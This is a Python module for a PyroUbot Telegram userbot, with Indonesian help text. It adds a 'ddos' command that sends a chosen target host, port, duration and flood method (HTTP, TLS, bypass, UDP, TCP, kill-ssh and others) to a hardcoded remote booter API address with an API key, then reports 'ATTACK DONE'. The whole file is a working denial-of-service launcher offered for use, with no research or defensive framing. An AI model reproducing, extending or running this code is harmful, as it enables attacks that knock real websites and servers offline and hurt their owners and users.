from PyroUbot import *
import requests

__MODULE__ = "ddos"
__HELP__ = """
<b>『 ʙᴀɴᴛᴜᴀɴ ᴜɴᴛᴜᴋ ᴅᴅᴏs 』</b>

  <b>• ᴘᴇʀɪɴᴛᴀʜ:</b> <code>{0}ddos</code> link port time method
  <b>• ᴍᴇᴛʜᴏᴅꜱ ʏᴀɴɢ ᴛᴇʀꜱᴇᴅɪᴀ: </b>
  
ʟᴀʏᴇʀ 7
[ɴɪɴᴊᴀ] [ʀᴀᴡ] [ꜰʟᴏᴏᴅ] [ꜱᴜᴘᴇʀ-ꜰʟᴏᴏᴅ] [ꜰʟᴏᴏᴅ-ᴘᴀɴᴇʟ] [ʜᴛᴛᴘ-x] [ᴛʟꜱ] [ᴛʟꜱᴠ3] [ʙʏᴘᴀꜱꜱ] [ꜱᴛʀɪᴋᴇ] [ꜱᴛᴀᴛɪᴄ] [ᴜʟᴛʀᴀ-ꜰʟᴏᴏᴅ] [ʙʀᴏᴡꜱᴇʀ]

ʟᴀʏᴇʀ 4
 [ᴋɪʟʟ-ᴘɪɴɢ] [ᴋɪʟʟ-ꜱꜱʜ] [ᴏᴠʜ] [ᴜᴅᴘ] [ᴛᴄᴘ]
 
ꜱʏꜱᴛᴇᴍ
[ʀᴇʙᴏᴏᴛ] [ᴘʀᴏxʏ] [ᴜᴘᴅᴀᴛᴇ]

  <b>• ᴘᴇɴᴊᴇʟᴀsᴀɴ:</b> ᴜɴᴛᴜᴋ ᴍᴇɴɢɪʀɪᴍ ᴘᴇʀᴍɪɴᴛᴀᴀɴ DDOS ᴋᴇ ʟɪɴᴋ ʏᴀɴɢ ᴅɪɴɢɪɴᴋᴀɴ
"""

AUTHORIZED_USER_ID = 7239918330

@PY.UBOT("ddos")
async def _(client, message):
    if message.from_user.id != AUTHORIZED_USER_ID:
        await message.reply_text("ANDA TIDAK MEMILIKI IZIN UNTUK MENGGUNAKAN PERINTAH INI🗿🗿.")
        return
    try:
        link = message.text.split(' ')[1]
        port = message.text.split(' ')[2]
        time = message.text.split(' ')[3]
        method = message.text.split(' ')[4]
        api_url = f"http://165.22.108.242:1234/api?key=memekmu&host={link}&port={port}&time={time}&method={method}"
        response = requests.get(api_url)
        if response.status_code == 200:
            await message.reply_text("ATTACK DONE BY ꜱᴇᴠꜱʙᴏᴛᴢ")
        else:
            await message.reply_text("GAGAL MENGIRIM DDOS.")
    except IndexError:
        await message.reply_text("ᴘᴇɴɢɢᴜɴᴀᴀɴ ꜱᴀʟᴀʜ ᴄᴏɴᴛᴏʜ\n.ᴅᴅᴏꜱ ʜᴛᴛᴘꜱ://ᴀʙᴄ.ᴄᴏᴍ 443 120 ʀᴀᴡ")
    except Exception as e:
        await message.reply_text(f"TERJADI KESALAHAN: {str(e)}")
